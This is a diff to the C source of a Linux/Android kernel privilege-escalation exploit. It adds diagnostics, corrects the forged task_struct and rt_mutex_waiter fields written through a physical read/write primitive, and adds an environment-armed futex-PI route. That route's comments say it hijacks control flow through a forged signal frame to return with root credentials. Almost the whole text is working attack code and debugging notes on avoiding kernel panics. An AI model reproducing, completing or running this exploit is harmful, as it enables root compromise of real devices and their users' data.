@@ -1,5 +1,16 @@
 #include "common.h"
 
+#ifdef FUTEX_POISON_PROBE
+#include "futex_pi_v14.h"
+/* Defined in fops.c. Called from run_p0_pipe_oracle_diagnostic() once the forged
+ * objects exist and the physrw fd is live - see the call site for why it cannot
+ * be reached any earlier. */
+int futex_poison_probe(int fd);
+#endif
+/* Also needed by the default-off live futex-PI route below, which is compiled into
+ * every build, not just the poison one. */
+#include "futex_pi_v14.h"
+
 #include <netinet/in.h>
 #if defined(SLIDE_STACK_WRITER) && \
     defined(SLIDE_STACK_WRITER_SIGRETURN) && \
@@ -1867,6 +1878,9 @@ static int slide_child_trigger_write(void) {
   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
+  rmg_diag("SLIDE child: waiter=%lu owner=%lu consumer=%lu armed\n",
+           (unsigned long)waiter, (unsigned long)owner,
+           (unsigned long)consumer);
 
   while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started) ||
@@ -1912,6 +1926,7 @@ static int slide_child_trigger_write(void) {
     return 0;
   }
   pr_info("slide pi stage=deadlock-accepted\n");
+  rmg_diag("SLIDE deadlock-accepted: waiting for route_done\n");
   atomic_store(&slide_deadlock_seen, 1);
   {
     /* Bound the route wait: the whole choreography completes in ~2-3s
@@ -1923,9 +1938,15 @@ static int slide_child_trigger_write(void) {
       usleep(1000);
       if (++route_wait_ms > 20000) {
         pr_error("slide pi route wait timed out after 20s\n");
+        rmg_diag("SLIDE route wait TIMED OUT after 20s\n");
         return 0;
       }
     }
+    rmg_diag("SLIDE route_done observed after %ldms waiter_ok=%d sched_ok=%d "
+             "write_window=%d\n",
+             route_wait_ms, (int)atomic_load(&slide_waiter_ok),
+             (int)atomic_load(&slide_consume_sched_ok),
+             (int)atomic_load(&slide_stack_write_window));
   }
 #if defined(APP_ACCEPT_SCHED_TRIGGER) && APP_ACCEPT_SCHED_TRIGGER
   int sched_ok = atomic_load(&slide_consume_sched_ok) != 0;
@@ -1954,6 +1975,10 @@ static int slide_trigger_physical_state(void) {
   SYSCHK(waitpid(child, &status, 0));
   int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
   pr_info("p0 physical write status=%d ok=%d\n", status, ok);
+  rmg_diag("SLIDE physrw child status=%d exited=%d code=%d signaled=%d sig=%d\n",
+           status, WIFEXITED(status),
+           WIFEXITED(status) ? WEXITSTATUS(status) : -1,
+           WIFSIGNALED(status), WIFSIGNALED(status) ? WTERMSIG(status) : 0);
   return ok;
 }
 
@@ -2384,30 +2409,22 @@ static int p0_diag_write64(int fd, uintptr_t address, uint64_t value) {
 static int prepare_p0_diag_waiter(int fd, uintptr_t waiter,
                                   uintptr_t parent, uintptr_t target,
                                   uintptr_t task, uintptr_t lock) {
-  if (!p0_diag_write64(fd, waiter + 0x00, 1) ||
-      !p0_diag_write64(fd, waiter + 0x08, 0) ||
-      !p0_diag_write64(fd, waiter + 0x10, 0)) {
+#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
+  if (!p0_diag_write64(fd, waiter + FAKE_WAITER_TREE_PARENT_OFF, 1) ||
+      !p0_diag_write64(fd, waiter + FAKE_WAITER_TREE_RIGHT_OFF, 0) ||
+      !p0_diag_write64(fd, waiter + FAKE_WAITER_TREE_LEFT_OFF, 0)) {
     return 0;
   }
-#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
-  return p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
-                         parent) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
-                         0) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
-                         target) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
+  /* The waiter's OWN task_struct pi_tree_entry is written by prepare_p0_diag_gate_payload via the
+   * FAKE_TASK_* offsets on the separate fake task; here we only lay down struct rt_mutex_waiter.
+   * Its task pointer MUST land at tree_entry + 0x18, because that is where rt_mutex_top_waiter()
+   * reads it after rb_entry(). */
+  return p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
          p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) &&
-#if COMPACT_RT_MUTEX_WAITER
          p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) &&
-#endif
          p0_diag_write32(fd, waiter + FAKE_WAITER_PRIO_OFF,
                          SLIDE_FAKE_WAITER_PRIO) &&
-         p0_diag_write64(fd, waiter + FAKE_WAITER_DEADLINE_OFF, 0)
-#if COMPACT_RT_MUTEX_WAITER
-         && p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0)
-#endif
-         ;
+         p0_diag_write64(fd, waiter + FAKE_WAITER_DEADLINE_OFF, 0);
 #else
   return p0_diag_write32(fd, waiter + FAKE_WAITER_TREE_PRIO_OFF,
                          SLIDE_FAKE_WAITER_PRIO) &&
@@ -2452,13 +2469,22 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
       !p0_diag_write32(fd, task + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO) ||
       !p0_diag_write32(fd, task + FAKE_TASK_NORMAL_PRIO_OFF,
                        FAKE_TASK_PRIO) ||
-      !p0_diag_write64(fd, task + FAKE_TASK_TASK_GROUP_OFF, 0) ||
+      /* task_group must be a REAL task_group. The reference writes root_task_group
+       * (04_fake_kernel_objects.c:131 -> kernel_base + TARGET_ROOT_TASK_GROUP_OFF). We wrote
+       * 0, and anything that walks group state - including the sched_setattr path this forge
+       * exists to reach - dereferences it and gets nowhere. */
+      !p0_diag_write64(fd, task + FAKE_TASK_TASK_GROUP_OFF, SLIDE_ROOT_TASK_GROUP) ||
       !p0_diag_write32(fd, task + FAKE_TASK_PI_LOCK_OFF, 0) ||
       !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF,
                        waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
       !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF + 0x08,
                        waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
-      !p0_diag_write64(fd, task + FAKE_TASK_PI_TOP_TASK_OFF, task) ||
+      /* pi_top_task MUST terminate the chain on a real task. We wrote `task` - i.e. the fake
+       * task pointed at ITSELF. That is the exact failure already recorded for this route: a
+       * self-referential rb_leftmost sends rb_erase into rb_next() and then into garbage, which
+       * is why the kernel died inside rt_mutex_dequeue_pi at rtmutex.c:1249 rather than doing
+       * anything useful. init_task is the correct terminator. */
+      !p0_diag_write64(fd, task + FAKE_TASK_PI_TOP_TASK_OFF, SLIDE_INIT_TASK) ||
       !p0_diag_write64(fd, task + FAKE_TASK_PI_BLOCKED_ON_OFF, 0)) {
     return 0;
   }
@@ -2489,6 +2515,81 @@ int run_p0_pipe_oracle_diagnostic(int fd) {
           slide_oracle_target, (unsigned long long)original_target);
   dump_p0_oracle_words(fd, "target-before", target_start, 20);
   dump_p0_oracle_words(fd, "parent-before", parent_start, 8);
+#ifdef FUTEX_POISON_PROBE
+  /* POISON PROBE fires HERE: after prepare_p0_diag_gate_payload() has laid the
+   * forged task_struct / rt_mutex_base down, after their addresses have been
+   * published through fake_task / fake_lock / fake_w0, and while the physrw fd
+   * is still live. futex_poison_probe() derives every address in its config from
+   * those globals, so the trigger cannot disagree with the objects it walks.
+   * We return its result instead of falling through to the oracle gate trigger -
+   * this build wants the v14 experiment, not the physrw one. */
+  {
+    int poison_triggered = futex_poison_probe(fd);
+    pr_info("POISON oracle route: probe returned triggered=%d step=%d (%s) "
+            "handler=%d\n",
+            poison_triggered, futex_pi_v14_last_step(),
+            futex_pi_v14_step_name(futex_pi_v14_last_step()),
+            futex_pi_v14_handler_result());
+    fflush(NULL);
+    return poison_triggered;
+  }
+#endif
+  /* FUTEX-PI v14 live route. DEFAULT OFF; additive. Arm with FUTEX_TRIGGER=1.
+   *
+   * Why this exists: the physrw is measured dead on this device (pwrite returns
+   * length, the bytes are absorbed, `WR predict ... grows=0` on every alias), and
+   * the kernel-side splice that was going to replace it is proven POINTER-ONLY.
+   * rbtree writes back through every value it stores (rb_set_parent_color does
+   * `rb->__rb_parent_color = p | color`), so a deposit of path bytes is followed by
+   * a store to an unmapped low address and the kernel panics. That closes
+   * modprobe_path: no surviving primitive can put data bytes into kernel .data.
+   *
+   * This route does not need to deposit data bytes. It installs a forged signal
+   * frame so the kernel returns into our code with root creds, which is a control
+   * flow hijack rather than a .data write, so it is not subject to the closure
+   * above.
+   *
+   * Every address comes from the forge globals, never recomputed from offsets: the
+   * live forge lays the objects down at the SLIDE_BANK_* offsets and publishes them
+   * via fake_task/fake_lock/fake_w0, so page_base+FAKE_TASK_OFF and page_base+W0_OFF
+   * name entirely different addresses. Deriving from the globals makes that class of
+   * mismatch impossible - the same reasoning as the poison probe above.
+   */
+  if (getenv("FUTEX_TRIGGER")) {
+    struct futex_pi_v14_config cfg;
+    memset(&cfg, 0, sizeof(cfg));
+    if (!fake_task || !fake_lock || !fake_w0) {
+      pr_error("FUTEX refusing to trigger: forge globals unset task=%016zx "
+               "lock=%016zx w0=%016zx\n",
+               fake_task, fake_lock, fake_w0);
+      return 0;
+    }
+    cfg.page_base = page_base;
+    cfg.target_fops = data_addr(ASHMEM_MISC_FOPS);
+    cfg.fake_fops = fake_fops;
+    cfg.fake_lock = fake_lock;
+    cfg.fake_task = fake_task;
+    /* The forged task's pi_waiters is an rb_root, and the node it is rooted at is the
+     * waiter's OWN pi_tree_entry. Verified against this tree's struct rt_mutex_waiter
+     * (kernel/locking/rtmutex_common.h:33):
+     *   tree_entry 0x00, pi_tree_entry 0x18, task 0x30, lock 0x38, wake_state 0x40,
+     *   prio 0x44, deadline 0x48, ww_ctx 0x50
+     * so pi_tree_entry sits at fake_w0 + 0x18. NB the `->task` field is at +0x30, not
+     * +0x18 - an earlier comment here claimed otherwise and was wrong. */
+    cfg.pi_waiters_self = fake_w0 + 0x18;
+    cfg.signal_scratch = page_base + SCRATCH_OFF;
+    pr_info("FUTEX cfg: page=%016zx target_fops=%016zx fake_fops=%016zx "
+            "lock=%016zx task=%016zx self=%016zx scratch=%016zx\n",
+            cfg.page_base, cfg.target_fops, cfg.fake_fops, cfg.fake_lock,
+            cfg.fake_task, cfg.pi_waiters_self, cfg.signal_scratch);
+    int futex_triggered = futex_pi_v14_trigger(&cfg);
+    pr_info("FUTEX oracle route: triggered=%d step=%d (%s) handler=%d\n",
+            futex_triggered, futex_pi_v14_last_step(),
+            futex_pi_v14_step_name(futex_pi_v14_last_step()),
+            futex_pi_v14_handler_result());
+    fflush(NULL);
+    return futex_triggered;
+  }
   if (!slide_trigger_physical_state()) {
     pr_error("p0 diagnostic gate trigger failed\n");
     return 0;
